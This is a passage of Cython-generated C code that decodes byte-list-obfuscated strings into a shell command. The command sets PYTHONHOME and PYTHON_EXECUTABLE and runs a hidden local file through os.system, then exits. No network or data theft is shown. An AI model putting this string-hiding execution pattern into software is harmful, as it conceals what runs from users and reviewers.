__Pyx_INCREF(__pyx_int_65);\n  __Pyx_GIVEREF(__pyx_int_65);\n  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_65);\n  __Pyx_INCREF(__pyx_int_84);\n  __Pyx_GIVEREF(__pyx_int_84);\n  PyList_SET_ITEM(__pyx_t_1, 9, __pyx_int_84);\n  __Pyx_INCREF(__pyx_int_69);\n  __Pyx_GIVEREF(__pyx_int_69);\n  PyList_SET_ITEM(__pyx_t_1, 10, __pyx_int_69);\n  __Pyx_INCREF(__pyx_int_47);\n  __Pyx_GIVEREF(__pyx_int_47);\n  PyList_SET_ITEM(__pyx_t_1, 11, __pyx_int_47);\n  __Pyx_INCREF(__pyx_int_50);\n  __Pyx_GIVEREF(__pyx_int_50);\n  PyList_SET_ITEM(__pyx_t_1, 12, __pyx_int_50);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 13, __pyx_int_48);\n  __Pyx_INCREF(__pyx_int_50);\n  __Pyx_GIVEREF(__pyx_int_50);\n  PyList_SET_ITEM(__pyx_t_1, 14, __pyx_int_50);\n  __Pyx_INCREF(__pyx_int_53);\n  __Pyx_GIVEREF(__pyx_int_53);\n  PyList_SET_ITEM(__pyx_t_1, 15, __pyx_int_53);\n  __Pyx_INCREF(__pyx_int_49);\n  __Pyx_GIVEREF(__pyx_int_49);\n  PyList_SET_ITEM(__pyx_t_1, 16, __pyx_int_49);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 17, __pyx_int_48);\n  __Pyx_INCREF(__pyx_int_49);\n  __Pyx_GIVEREF(__pyx_int_49);\n  PyList_SET_ITEM(__pyx_t_1, 18, __pyx_int_49);\n  __Pyx_INCREF(__pyx_int_49);\n  __Pyx_GIVEREF(__pyx_int_49);\n  PyList_SET_ITEM(__pyx_t_1, 19, __pyx_int_49);\n  __Pyx_INCREF(__pyx_int_49);\n  __Pyx_GIVEREF(__pyx_int_49);\n  PyList_SET_ITEM(__pyx_t_1, 20, __pyx_int_49);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 21, __pyx_int_48);\n  __Pyx_INCREF(__pyx_int_53);\n  __Pyx_GIVEREF(__pyx_int_53);\n  PyList_SET_ITEM(__pyx_t_1, 22, __pyx_int_53);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 23, __pyx_int_48);\n  __Pyx_INCREF(__pyx_int_49);\n  __Pyx_GIVEREF(__pyx_int_49);\n  PyList_SET_ITEM(__pyx_t_1, 24, _""_pyx_int_49);\n  __Pyx_INCREF(__pyx_int_55);\n  __Pyx_GIVEREF(__pyx_int_55);\n  PyList_SET_ITEM(__pyx_t_1, 25, __pyx_int_55);\n  __Pyx_INCREF(__pyx_int_56);\n  __Pyx_GIVEREF(__pyx_int_56);\n  PyList_SET_ITEM(__pyx_t_1, 26, __pyx_int_56);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 27, __pyx_int_48);\n  __Pyx_INCREF(__pyx_int_48);\n  __Pyx_GIVEREF(__pyx_int_48);\n  PyList_SET_ITEM(__pyx_t_1, 28, __pyx_int_48);\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXECUTE_FILE, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_prefix); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 39, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PREFIX, __pyx_t_2) < 0) __PYX_ERR(0, 39, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = PyList_New(18); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_INCREF(__pyx_int_101);\n  __Pyx_GIVEREF(__pyx_int_101);\n  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_101);\n  __Pyx_INCREF(__pyx_int_120);\n  __Pyx_GIVEREF(__pyx_int_120);\n  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_120);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_112);\n  __Py""x_INCREF(__pyx_int_111);\n  __Pyx_GIVEREF(__pyx_int_111);\n  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_111);\n  __Pyx_INCREF(__pyx_int_114);\n  __Pyx_GIVEREF(__pyx_int_114);\n  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_114);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_80);\n  __Pyx_GIVEREF(__pyx_int_80);\n  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_80);\n  __Pyx_INCREF(__pyx_int_89);\n  __Pyx_GIVEREF(__pyx_int_89);\n  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_89);\n  __Pyx_INCREF(__pyx_int_84);\n  __Pyx_GIVEREF(__pyx_int_84);\n  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_84);\n  __Pyx_INCREF(__pyx_int_72);\n  __Pyx_GIVEREF(__pyx_int_72);\n  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_72);\n  __Pyx_INCREF(__pyx_int_79);\n  __Pyx_GIVEREF(__pyx_int_79);\n  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_79);\n  __Pyx_INCREF(__pyx_int_78);\n  __Pyx_GIVEREF(__pyx_int_78);\n  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_78);\n  __Pyx_INCREF(__pyx_int_72);\n  __Pyx_GIVEREF(__pyx_int_72);\n  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_72);\n  __Pyx_INCREF(__pyx_int_79);\n  __Pyx_GIVEREF(__pyx_int_79);\n  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_79);\n  __Pyx_INCREF(__pyx_int_77);\n  __Pyx_GIVEREF(__pyx_int_77);\n  PyList_SET_ITEM(__pyx_t_2, 15, __pyx_int_77);\n  __Pyx_INCREF(__pyx_int_69);\n  __Pyx_GIVEREF(__pyx_int_69);\n  PyList_SET_ITEM(__pyx_t_2, 16, __pyx_int_69);\n  __Pyx_INCREF(__pyx_int_61);\n  __Pyx_GIVEREF(__pyx_int_61);\n  PyList_SET_ITEM(__pyx_t_2, 17, __pyx_int_61);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)"") __PYX_ERR(0, 57, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_3 = PyNumber_Add(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHONHOME, __pyx_t_3) < 0) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = PyList_New(25); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 58, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_101);\n  __Pyx_GIVEREF(__pyx_int_101);\n  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_101);\n  __Pyx_INCREF(__pyx_int_120);\n  __Pyx_GIVEREF(__pyx_int_120);\n  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_120);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_112);\n  __Pyx_INCREF(__pyx_int_111);\n  __Pyx_GIVEREF(__pyx_int_111);\n  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_111);\n  __Pyx_INCREF(__pyx_int_114);\n  __Pyx_GIVEREF(__pyx_int_114);\n  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_114);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_80);\n  __Pyx_GIVEREF(__pyx_int_80);\n  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_80);\n  __Pyx_INCREF(__pyx_int_89);\n  __Pyx_GIVEREF(__pyx_int_89);\n  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_89);\n  __Pyx_INCREF(__pyx_int_84);\n  __Pyx_GIVEREF(__pyx_int_84);\n  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_84);\n  __Pyx_INCREF(__pyx_int_72);\n  __Pyx_GIVEREF(__pyx_int_72);\n  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_72);\n  __Pyx_I""NCREF(__pyx_int_79);\n  __Pyx_GIVEREF(__pyx_int_79);\n  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_79);\n  __Pyx_INCREF(__pyx_int_78);\n  __Pyx_GIVEREF(__pyx_int_78);\n  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_78);\n  __Pyx_INCREF(__pyx_int_95);\n  __Pyx_GIVEREF(__pyx_int_95);\n  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_95);\n  __Pyx_INCREF(__pyx_int_69);\n  __Pyx_GIVEREF(__pyx_int_69);\n  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_69);\n  __Pyx_INCREF(__pyx_int_88);\n  __Pyx_GIVEREF(__pyx_int_88);\n  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_88);\n  __Pyx_INCREF(__pyx_int_69);\n  __Pyx_GIVEREF(__pyx_int_69);\n  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_69);\n  __Pyx_INCREF(__pyx_int_67);\n  __Pyx_GIVEREF(__pyx_int_67);\n  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_67);\n  __Pyx_INCREF(__pyx_int_85);\n  __Pyx_GIVEREF(__pyx_int_85);\n  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_85);\n  __Pyx_INCREF(__pyx_int_84);\n  __Pyx_GIVEREF(__pyx_int_84);\n  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_84);\n  __Pyx_INCREF(__pyx_int_65);\n  __Pyx_GIVEREF(__pyx_int_65);\n  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_int_65);\n  __Pyx_INCREF(__pyx_int_66);\n  __Pyx_GIVEREF(__pyx_int_66);\n  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_int_66);\n  __Pyx_INCREF(__pyx_int_76);\n  __Pyx_GIVEREF(__pyx_int_76);\n  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_int_76);\n  __Pyx_INCREF(__pyx_int_69);\n  __Pyx_GIVEREF(__pyx_int_69);\n  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_int_69);\n  __Pyx_INCREF(__pyx_int_61);\n  __Pyx_GIVEREF(__pyx_int_61);\n  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_int_61);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 82, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_Ge""tModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_executable); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 82, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 82, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_INCREF(__pyx_int_46);\n  __Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_46);\n  __Pyx_INCREF(__pyx_int_47);\n  __Pyx_GIVEREF(__pyx_int_47);\n  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_47);\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RUN, __pyx_t_3) < 0) __PYX_ERR(0, 84, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 ="" 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_isfile); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 86, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (__pyx_t_4) {\n\n\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n\n\n    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_INCREF(__pyx_int_32);\n    __Pyx_GIVEREF(__pyx_int_32);\n    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);\n    __Pyx_INCREF(__pyx_int_38);\n    __Pyx_GIVEREF(__pyx_int_38);\n    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);\n    __Pyx""_INCREF(__pyx_int_38);\n    __Pyx_GIVEREF(__pyx_int_38);\n    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);\n    __Pyx_INCREF(__pyx_int_32);\n    __Pyx_GIVEREF(__pyx_int_32);\n    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);\n    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n\n\n    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_INCREF(__pyx_int_32);\n    __Pyx_GIVEREF(__pyx_int_32);\n    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);\n    __Pyx_INCREF(__pyx_int_38);\n    __Pyx_GIVEREF(__pyx_int_38);\n    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);\n    __Pyx_INCREF(__pyx_int_38);\n    __Pyx_GIVEREF(__pyx_int_38);\n    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);\n    __Pyx_INCREF(__pyx_int_32);\n    __Pyx_GIVEREF(__pyx_int_32);\n    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);\n    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!""__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 89, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n\n\n    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 92, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  }\n\n\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_SOURCE, __pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define) < 0) __PYX_ERR(0, 94, __pyx_L1_error)\n\n\n  __pyx_t_3 = PyList_New(13); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5686, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_46);\n  __Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_46);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_112);\n  __Pyx_INCREF(__pyx_int_121);""\n  __Pyx_GIVEREF(__pyx_int_121);\n  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_121);\n  __Pyx_INCREF(__pyx_int_95);\n  __Pyx_GIVEREF(__pyx_int_95);\n  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_95);\n  __Pyx_INCREF(__pyx_int_112);\n  __Pyx_GIVEREF(__pyx_int_112);\n  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_112);\n  __Pyx_INCREF(__pyx_int_114);\n  __Pyx_GIVEREF(__pyx_int_114);\n  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_114);\n  __Pyx_INCREF(__pyx_int_105);\n  __Pyx_GIVEREF(__pyx_int_105);\n  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_105);\n  __Pyx_INCREF(__pyx_int_118);\n  __Pyx_GIVEREF(__pyx_int_118);\n  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_118);\n  __Pyx_INCREF(__pyx_int_97);\n  __Pyx_GIVEREF(__pyx_int_97);\n  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);\n  __Pyx_INCREF(__pyx_int_116);\n  __Pyx_GIVEREF(__pyx_int_116);\n  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_116);\n  __Pyx_INCREF(__pyx_int_101);\n  __Pyx_GIVEREF(__pyx_int_101);\n  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_101);\n  __Pyx_INCREF(__pyx_int_46);\n  __Pyx_GIVEREF(__pyx_int_46);\n  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_46);\n  __Pyx_INCREF(__pyx_int_99);\n  __Pyx_GIVEREF(__pyx_int_99);\n  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_99);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5686, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5687, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 5686, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5689, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_46);\n  